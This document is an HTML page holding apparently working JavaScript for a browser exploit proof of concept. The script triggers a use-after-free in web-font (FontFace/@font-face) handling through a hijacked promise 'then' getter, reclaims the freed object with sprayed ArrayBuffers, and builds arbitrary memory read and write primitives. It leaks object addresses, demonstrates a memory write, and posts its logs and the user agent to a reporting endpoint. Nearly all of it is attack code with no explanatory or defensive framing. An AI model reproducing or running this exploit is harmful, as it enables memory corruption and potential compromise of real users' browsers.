<!doctype html><html><head><meta charset="utf-8"><title>CSF ARW</title>
<style>body{margin:0;padding:14px;background:#07090d;color:#cfe3ff;font-family:system-ui}
#o{white-space:pre-wrap;font:12px/1.4 ui-monospace,monospace;color:#9fb4d6}</style></head>
<body><div id="s">ARW</div><pre id="o"></pre><script>
var out=document.getElementById("o"),LOG=[];
function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
function log(s){out.textContent+=s+"\n";LOG.push(s);try{send();}catch(e){}}
var SZ=0xb8, OFF_FS=0x28, OFF_FS_SZ=0x30, OFF_FS_CAP=0x34, OFF_ST=0x7a;
function hx(lo,hi){return "0x"+("00000000"+(hi>>>0).toString(16)).slice(-8)+("00000000"+(lo>>>0).toString(16)).slice(-8);}
function plaus(lo,hi){return hi<=0xffff && (lo%8)===0 && (hi!==0||lo>=0x10000);}
async function uaf(){
  var SPRAY=0xb0, abs=[], uaf_font=null, uaf_ab=null, style=document.createElement("style");
  var sr="@font-face{font-family:spray;src:local(systemfont);unicode-range:U+0043;}";
  var ur="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
  document.fonts.add(A); void A.loaded;
  document.head.append(style);
  for(var i=0;i<SPRAY/4;i++) style.sheet.insertRule(sr, style.sheet.cssRules.length);
  var ui=style.sheet.cssRules.length; style.sheet.insertRule(ur, style.sheet.cssRules.length);
  for(var i=SPRAY/4;i<SPRAY;i++) style.sheet.insertRule(sr, style.sheet.cssRules.length);
  void document.body.offsetHeight;
  var ot=FontFace.prototype.then;
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
    if(this!==A) return undefined; log("[uaf] getter");
    style.sheet.deleteRule(ui); void document.body.offsetHeight;
    for(var i=style.sheet.cssRules.length-1;i>=0;i--){ if(style.sheet.cssRules[i].cssText.indexOf("spray")!==-1) style.sheet.deleteRule(i); }
    void document.body.offsetHeight;
    for(var i=0;i<SPRAY;i++){ var ab=new ArrayBuffer(SZ); var dv=new DataView(ab); dv.setUint32(8,1,true); dv.setUint8(OFF_ST,3); abs.push(ab); }
    return undefined;}});
  var fs=null; try{ fs=await document.fonts.load("1em a, b","AB"); }catch(e){}
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
  if(!fs||fs.length!==2){ log("[uaf] none"); return null; }
  for(var i=0;i<fs.length;i++){ if(fs[i].unicodeRange==="U+0-10FFFF"){ uaf_font=fs[i]; break; } }
  for(var i=0;i<abs.length;i++){ if(new DataView(abs[i]).getUint32(8,true)===2){ uaf_ab=abs[i]; break; } }
  if(!uaf_font||!uaf_ab){ log("[uaf] no reclaim"); return null; }
  log("[uaf] font+ab ok");
  return {font:uaf_font, ab:uaf_ab};
}

(async function(){
  log("ARW — NF/7.0.3.12.11");
  var u=await uaf(); if(!u) return;
  var dv=new DataView(u.ab);
  function setPtr(off,lo,hi){ dv.setUint32(off,lo>>>0,true); dv.setUint32(off+4,hi>>>0,true); }
  // READ: m_featureSettings buffer -> addr
  function read(lo,hi,size){
    var ab=new ArrayBuffer(size), u8=new Uint8Array(ab), o=0;
    while(o<size){ setPtr(OFF_FS,(lo+o)>>>0,hi); dv.setInt32(OFF_FS_SZ,1,true); dv.setInt32(OFF_FS_CAP,1,true);
      var s=u.f_font||u.font.featureSettings; for(var i=1;i<5&&o<size;i++) u8[o++]=s.charCodeAt(i)&0xff; }
    return ab;
  }
  // WRITE: m_clients container -> target-0x10 ; removeClient rehash writes count at target, target+4
  function write(lo,hi){
    setPtr(0x58,(lo-0x10)>>>0,hi);
    try{ document.fonts.delete(u.font); }catch(e){}
  }
  // leak chain
  var wrap={lo:dv.getUint32(0x60,true),hi:dv.getUint32(0x64,true)};
  var w=new Uint8Array(read(wrap.lo,wrap.hi,32));
  var face={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0,hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
  log("[leak] FontFace="+hx(face.lo,face.hi));
  var b=read(face.lo,face.hi,0x38);
  var bdv=new DataView(b.buffer||b);
  var back={lo:0,hi:0};
  // m_backing at +0x30
  var bb=new Uint8Array(read(face.lo,face.hi,0x40));
  back={lo:(bb[0x30]|bb[0x31]<<8|bb[0x32]<<16|bb[0x33]<<24)>>>0, hi:(bb[0x34]|bb[0x35]<<8|bb[0x36]<<16|bb[0x37]<<24)>>>0};
  log("[leak] CSSFontFace="+hx(back.lo,back.hi));
  if(!plaus(back.lo,back.hi)){ log("bad backing"); return; }
  // prove write: target = backing+0x7a (the status field we know is 3), write count there
  var tgt={lo:(back.lo+0x7a)>>>0,hi:back.hi};
  log("[write] target="+hx(tgt.lo,tgt.hi)+" (status byte)");
  write(tgt.lo,tgt.hi);
  var after=new Uint8Array(read(tgt.lo,tgt.hi,1))[0];
  log("[write] status now="+after+"  <== WRITE POC (value=container count)");
  log("done");
})();
</script></body></html>
